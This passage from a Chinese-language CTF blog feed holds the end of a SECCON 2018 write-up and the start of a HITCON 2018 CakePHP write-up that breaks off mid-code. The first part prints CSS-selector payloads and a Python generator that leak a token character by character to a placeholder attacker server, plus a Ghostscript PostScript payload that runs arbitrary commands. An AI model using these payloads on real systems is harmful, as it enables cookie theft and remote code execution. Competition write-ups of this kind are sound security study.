class="selector-attr">[value^=<span class="string">&quot;8&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=8&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;9&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=9&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>原理是利用css选择器，当css解释器对每一个选择器进行解释时，如果找到了input的属性value的值符合其中的一个的话，就会向鄙人的xss服务器发送一次请求，这样就能确定每一位的value，最后可以获得整个csrf的值，比如第一次在xss服务器上获得的请求时match=b，则第二次的payload为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;ba&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=ba&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;bb&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=bb&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;bc&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=bc&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;bd&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=bd&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;be&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=be&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;bf&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=bf&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b0&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b0&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b1&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b1&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b2&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b2&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b3&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b3&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b4&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b4&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b5&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b5&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b6&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b6&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b7&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b7&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b8&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b8&quot;</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">&quot;b9&quot;</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;http://xxxxxxx.xx/xss/?match=b9&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>以此类推最后拿到整个cookie<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233019.png"><br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233045.png"></p><blockquote><p>这里有一个细节需要解释一下：这里最后拿到的cookie和之前截图中的cookie是一样的，是因为最前面截的图是题目已经做完了以后截图，当时已经劫持了获取到的cookie，但是在做题的时候cookie是不一样的，</p></blockquote><p>脚本如下(每次需要输入上次获取到的字符)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2130706433/?css=%s&amp;msg=&amp;action=msgadm2&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;input[value^=&quot;%sa&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sa&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%sb&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sb&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%sc&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sc&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%sd&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sd&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%se&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%se&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%sf&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%sf&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s0&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s0&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s1&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s1&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s2&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s2&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s3&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s3&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s4&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s4&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s5&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s5&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s6&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s6&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s7&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s7&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s8&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s8&quot;)&#125;</span></span><br><span class="line"><span class="string">input[value^=&quot;%s9&quot;]&#123;background:url(&quot;http://xxxxxxx.xx/xss/?match=%s9&quot;)&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;da&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = payload % (</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">print</span> p</span><br><span class="line">    u = url % base64.b64encode(p)</span><br><span class="line">    <span class="keyword">print</span> u</span><br><span class="line"></span><br><span class="line">    result += raw_input(<span class="string">&#x27;[*] Char: &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在获取到cookie之后进行劫持，就可以在本机看到upload image的地址了<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233507.png"></p><p>在upload界面，首先需要上传一个jpg图片，之后会把jpg图片转换为gif图片，上传的jpg图片的文件名以及后缀都不可控，只有图片内容可控</p><p>通过cookie的名字”CGISESSID”可以知道后端是perl，而perl处理图片用的是”ImageMagick”，最开始以后是ImageMagick的RCE，但是一直没有成功，后来才想起来题目是”GhostKingdom”，而在ImageMagick中做图片的转换时使用了ghostscript，而GhostScript也存在一个RCE漏洞，但是这个洞并没有CVE的编号所以才将注意力转移到ghostscript</p><p>关于GhostScript的漏洞分析请参考<a href="https://www.anquanke.com/post/id/157380">https://www.anquanke.com/post/id/157380</a></p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line"></span><br><span class="line">userdict &#x2F;setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark &#x2F;OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure><p>将上面的payload保存到一个jpg文件中，第7行的id可以换成任何想执行的命令，上传以后再转换为gif，触发漏洞，拿到flag的文件名<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027225501.png"><br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027225514.png"></p><p>最后拿到flag<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027234138.png"></p>]]></content>
    
    
    <summary type="html">这次参加了Seccon2018，鄙人有幸做出了一道题，感觉其中利用css获取数据的方法非常好。</summary>
    
    
    
    <category term="CTF" scheme="https://srpopty.github.io/categories/CTF/"/>
    
    
    <category term="WriteUp" scheme="https://srpopty.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon 2018 BabyCake Writeup</title>
    <link href="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/"/>
    <id>https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/</id>
    <published>2018-10-27T15:07:21.000Z</published>
    <updated>2020-08-11T08:44:37.584Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Baby-Cake"><a href="#Baby-Cake" class="headerlink" title="Baby Cake"></a>Baby Cake</h1><blockquote><p>Get the shell plz!!!!!</p></blockquote><p>题目简单明了，直接给了全部源码(不像某些国内垃圾比赛全靠脑洞做题)，整个网站实现的功能就是根据url参数去请求目标网页，如果是Get的话会存cache在本地，Post的话将会直接把data参数post到目标网站，并且不会保存cache。<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231031.png"></p><h2 id="本地任意文件读取"><a href="#本地任意文件读取" class="headerlink" title="本地任意文件读取"></a>本地任意文件读取</h2><p>网站使用了CakePHP框架，对目标url的请求也是调用了CakePHP的API，整站的源码打包下载下来，解压出来有快30个M…目录结构也非常复杂。<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231318.png"><br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231423.png"></p><p>查看CakePHP的文档找到<a href="https://book.cakephp.org/2.0/zh/getting-started/cakephp-folder-structure.html">目录结构</a></p><p>这里重点关注src以及vendor目录，controller位于src目录下<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231604.png"><br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231609.png"></p><p>src保存网站源码，而vendor则保存所有的第三方库，其中包括了CakePHP的源码。整个网站主要源码位于<code>/src/Controller/PagesController.php</code>里，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Configure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">ForbiddenException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">NotFoundException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">View</span>\<span class="title">Exception</span>\<span class="title">MissingTemplateException</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DymmyResponse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$headers, $body</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers = $headers;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body = $body;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PagesController</span> <span class="keyword">extends</span> <span class="title">AppController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span>(<span class="params">$method, $url, $headers, $data</span>) </span>&#123;</span><br><span class="line">        $options = [</span><br><span class="line">            <span class="string">&#x27;headers&#x27;</span> =&gt; $headers, </span><br><span class="line">            <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">10</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $http = <span class="keyword">new</span> Client();</span><br><span class="line">        <span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">back</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">&#x27;pages&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_cache_dir</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $ip = <span class="keyword">$this</span>-&gt;request-&gt;getEnv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">        $index = sprintf(<span class="string">&#x27;mycache/%s/%s/&#x27;</span>, $ip, $key);</span><br><span class="line">        <span class="keyword">return</span> CACHE . $index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span>(<span class="params">$key, $response</span>) </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($cache_dir) ) &#123;</span><br><span class="line">            mkdir($cache_dir, <span class="number">0700</span>, <span class="literal">true</span>);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">&quot;body.cache&quot;</span>, $response-&gt;body);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">&quot;headers.cache&quot;</span>, serialize($response-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span>(<span class="params">$key</span>) </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> (file_exists($cache_dir)) &#123;</span><br><span class="line">            $body   = file_get_contents($cache_dir . <span class="string">&quot;/body.cache&quot;</span>);</span><br><span class="line">            $headers = file_get_contents($cache_dir . <span class="string">&quot;/headers.cache&quot;</span>);</span><br><span class="line"></span><br><span class="line">            $body = <span class="string">&quot;&lt;!-- from cache --&gt;\n&quot;</span> . $body;</span><br><span class="line">            $headers = unserialize($headers);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DymmyResponse($headers, $body);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params">...$path</span>) </span>&#123;</span><br><span class="line">        $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">        $data = $request-&gt;getQuery(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">        $url  = $request-&gt;getQuery(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strlen($url) == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );</span><br><span class="line">        <span class="keyword">if</span> (strlen($scheme) == <span class="number">0</span> || !in_array($scheme, [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $method = strtolower( $request-&gt;getMethod() );</span><br><span class="line">        <span class="keyword">if</span> ( !in_array($method, [<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;put&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;patch&#x27;</span>]) )</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($request-&gt;getHeaders() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array( strtolower($key), [<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>, <span class="string">&#x27;expect&#x27;</span>, <span class="string">&#x27;content-length&#x27;</span>] ))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (count($value) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $headers[$key] = $value[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $key = md5($url);</span><br><span class="line">        <span class="keyword">if</span> ($method == <span class="string">&#x27;get&#x27;</span>) &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;cache_get($key);</span><br><span class="line">            <span class="keyword">if</span> (!$response) &#123;</span><br><span class="line">                $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cache_set($key, $response);                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($response-&gt;headers <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strtolower($key) == <span class="string">&#x27;content-type&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="keyword">array</span>(<span class="string">&#x27;type&#x27;</span> =&gt; $value));</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response-&gt;withHeader($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;response-&gt;body($response-&gt;body);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要逻辑在display函数中，这里只关心输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params">...$path</span>) </span>&#123;</span><br><span class="line"> $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line"> $data = $request-&gt;getQuery(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line"> $url  = $request-&gt;getQuery(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">...</span><br><span class="line">$key = md5($url);</span><br><span class="line"><span class="keyword">if</span> ($method == <span class="string">&#x27;get&#x27;</span>) &#123; <span class="comment">// 如果是GET</span></span><br><span class="line">$response = <span class="keyword">$this</span>-&gt;cache_get($key); <span class="comment">// 尝试获取本地缓存</span></span><br><span class="line"><span class="keyword">if</span> (!$response) &#123; <span class="comment">// 没有缓存则直接远程请求</span></span><br><span class="line">$response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;cache_set($key, $response); <span class="comment">// 将请求结果放到缓存中</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// POST不缓存，直接带着data请求</span></span><br><span class="line">$response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的请求方式调用了<code>httpclient($method, $url, $headers, $data)</code>函数，下面看看这个函数做了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span>(<span class="params">$method, $url, $headers, $data</span>) </span>&#123;</span><br><span class="line">$options = [</span><br><span class="line"><span class="string">&#x27;headers&#x27;</span> =&gt; $headers,</span><br><span class="line"><span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">10</span></span><br><span class="line">];</span><br><span class="line">$http = <span class="keyword">new</span> Client();</span><br><span class="line"><span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中才真正调用了CakePHP的远程请求API<code>$http-&gt;$method($url, $data, $options)</code>，跟进到CakePHP的API中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$http = <span class="keyword">new</span> Client();</span><br><span class="line"><span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br></pre></td></tr></table></figure><p>Client类是从<code>Cake\Http\Client</code>中调用的，这个类位于<code>\vendor\cakephp\cakephp\src\Http\Client.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> 